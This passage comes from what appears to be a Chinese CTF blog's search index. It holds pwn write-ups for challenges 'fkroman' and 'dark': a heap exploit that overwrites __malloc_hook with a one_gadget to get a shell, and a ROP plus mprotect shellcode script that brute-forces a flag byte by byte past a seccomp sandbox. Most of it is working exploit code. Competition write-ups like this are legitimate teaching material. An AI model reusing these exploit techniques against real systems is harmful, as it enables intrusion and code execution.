'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    s(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = remote(<span class="string">'121.40.246.48'</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#io = process('./fkroman', env = &#123;"LD_PRELOAD":"./a.so"&#125;)</span></span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit1(<span class="number">1</span>,<span class="number">0xa</span>+<span class="number">0x98</span>, <span class="string">'/bin/sh\x00'</span> + <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + <span class="string">'\xdd\x25'</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit1(<span class="number">0</span>, <span class="number">1</span>, <span class="string">'\x10'</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">3</span> + <span class="string">'a'</span>*<span class="number">0x30</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    edit1(<span class="number">7</span>, len(payload), payload)</span><br><span class="line">    rn(<span class="number">0x40</span>)</span><br><span class="line">    leak = u64(rn(<span class="number">8</span>))</span><br><span class="line">    log.success(<span class="string">"leak: "</span>+hex(leak))</span><br><span class="line">    libc_base = leak - <span class="number">192</span> - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">'libc_base: '</span>+hex(libc.address))</span><br><span class="line">    _free_hook = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    _malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'malloc hook: '</span>+hex(_malloc_hook))</span><br><span class="line">    r()</span><br><span class="line">    raw_input()</span><br><span class="line">    add(<span class="number">14</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">15</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    edit1(<span class="number">9</span>, <span class="number">8</span>, p64(_malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    r()</span><br><span class="line">    sl(<span class="string">''</span>)</span><br><span class="line">    sl(<span class="string">''</span>)</span><br><span class="line">    r()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    add(<span class="number">10</span>, <span class="number">0x60</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    add(<span class="number">11</span>, <span class="number">0x60</span>)</span><br><span class="line">    sys = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    one_gadget = libc.address + <span class="number">0x4526a</span> <span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">    </span><br><span class="line">    edit1(<span class="number">11</span>, <span class="number">0x1b</span>, <span class="string">'\x00'</span>*<span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x10</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            libc.address = <span class="number">0</span></span><br><span class="line">            <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<h1 id="dark"><a href="#dark" class="headerlink" title="dark"></a>dark</h1><h2 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/shuzijingji/dark/dark&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>很开心</p>
<h2 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h2><p>逻辑很简单，一个栈溢出，一个加了保护的沙箱，单纯的逃逸</p>
<p>看一下沙箱允许的系统调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>只允许read，open和mprotect</p>
<h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><ol>
<li>先用mprotect给bss段可执行权限</li>
<li>在bss中构造shellcode</li>
<li>shellcode需要能做到按位进行比对，成功则继续，失败则退出</li>
</ol>
<h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><p>在前人的基础上改进而来</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./dark'</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_func</span><span class="params">(r12, r13, r14, r15)</span>:</span></span><br><span class="line">    buf = p64(<span class="number">0x401272</span>)</span><br><span class="line">    buf += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">    buf += p64(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">    buf += p64(r12) <span class="comment"># func name</span></span><br><span class="line">    buf += p64(r13) <span class="comment"># rdx</span></span><br><span class="line">    buf += p64(r14) <span class="comment"># rsi</span></span><br><span class="line">    buf += p64(r15) <span class="comment"># rdi</span></span><br><span class="line">    buf += p64(<span class="number">0x401258</span>)</span><br><span class="line">    buf += <span class="string">'0'</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare big rop chain, because the previous overflow size is not enough for all the</span></span><br><span class="line"><span class="comment"># operations</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(io, offset, cmpval)</span>:</span></span><br><span class="line">    <span class="comment">#io = remote('121.41.41.111', 9999)</span></span><br><span class="line">    bss_addr = <span class="number">0x404100</span></span><br><span class="line">    pop_rbp = <span class="number">0x401149</span></span><br><span class="line">    leave_ret = <span class="number">0x4011ef</span></span><br><span class="line">    b = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">    b += <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss_addr, <span class="number">0x300</span>)</span><br><span class="line">    b += p64(pop_rbp)</span><br><span class="line">    b += p64(bss_addr)</span><br><span class="line">    b += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io, 'b *0x40121E')</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.send(b)</span><br><span class="line">    <span class="comment"># read ROP to it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    bss_addr2 = <span class="number">0x404500</span></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    b = <span class="string">'''</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rdi, 0x404278</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xchg rax, rdi</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, 0x404500</span></span><br><span class="line"><span class="string">    mov rdx, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, 0x404500</span></span><br><span class="line"><span class="string">    add rcx, %d</span></span><br><span class="line"><span class="string">    mov al, byte ptr [rcx]</span></span><br><span class="line"><span class="string">    cmp al, %d</span></span><br><span class="line"><span class="string">    jz good</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    bad:</span></span><br><span class="line"><span class="string">    mov rax, 0x40000001</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    good:</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x404700</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp good</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    SC = asm(b % (offset, cmpval))</span><br><span class="line"></span><br><span class="line">    b = p64(<span class="number">0</span>) <span class="comment"># for pop ebp in leave</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, elf.got[<span class="string">'alarm'</span>], <span class="number">1</span>) <span class="comment"># set the elf.got['alarm'] to syscall</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss_addr2, <span class="number">10</span>) <span class="comment"># set rax 10</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'alarm'</span>], <span class="number">0x404000</span>, <span class="number">0x1000</span>, <span class="number">7</span>) <span class="comment"># mprotect()</span></span><br><span class="line">    b += p64(<span class="number">0x404300</span>)</span><br><span class="line">    b += <span class="string">'flag\x00'</span></span><br><span class="line">    b = b.ljust(<span class="number">0x200</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    b += SC</span><br><span class="line">    io.send(b)</span><br><span class="line">    <span class="comment"># read one byte to the got</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">'\x05'</span>)</span><br><span class="line">    <span class="comment"># read 10 bytes to set the rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">'1'</span> * <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">brute</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, starts, end)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.starts = starts</span><br><span class="line">        self.end = end</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> trueflag</span><br><span class="line">        <span class="keyword">global</span> f</span><br><span class="line">        flag = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.starts, self.end):</span><br><span class="line">            <span class="keyword">if</span> f &gt; self.starts:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>, <span class="number">128</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        io = process(binary)</span><br><span class="line">                        main(io, i, j)</span><br><span class="line">                        sleep(<span class="number">2</span>)</span><br><span class="line">                        io.send(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line">                        flag.append(chr(j))</span><br><span class="line">                        log.success(flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        io.kill()</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        trueflag[self.starts // <span class="number">3</span>] = <span class="string">''</span>.join(flag)</span><br><span class="line">        <span class="keyword">if</span> len(flag) &gt; <span class="number">0</span> <span class="keyword">and</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span>:</span><br><span class="line">            f = self.starts</span><br><span class="line"></span><br><span class="line">f = <span class="number">10000</span></span><br><span class="line">a = datetime.datetime.now()</span><br><span class="line">thread = []</span><br><span class="line">trueflag = list((<span class="string">'\x00'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    b = brute(i*<span class="number">3</span>, (i+<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    b.start()</span><br><span class="line">    thread.append(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(trueflag)</span><br><span class="line">b = datetime.datetime.now()</span><br><span class="line">second = (b - a).seconds</span><br><span class="line">minute = second / <span class="number">60</span></span><br><span class="line"><span class="keyword">print</span> second, <span class="string">'s'</span></span><br><span class="line"><span class="keyword">print</span> minute, <span class="string">'m'</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hello-world]]></title>
      <url>/2019/10/03/hello-world/</url>
      <content type="html"><![CDATA[<h3 id="因为琐事买了服务器，从此就在这上面写博客吧……"><a href="#因为琐事买了服务器，从此就在这上面写博客吧……" class="headerlink" title="因为琐事买了服务器，从此就在这上面写博客吧……"></a>因为琐事买了服务器，从此就在这上面写博客吧……</h3>]]></content>
      
        <categories>
            
            <category> 学习日记 </category>
            
        </categories>
        
        
    </entry>
    
  
  
</search>
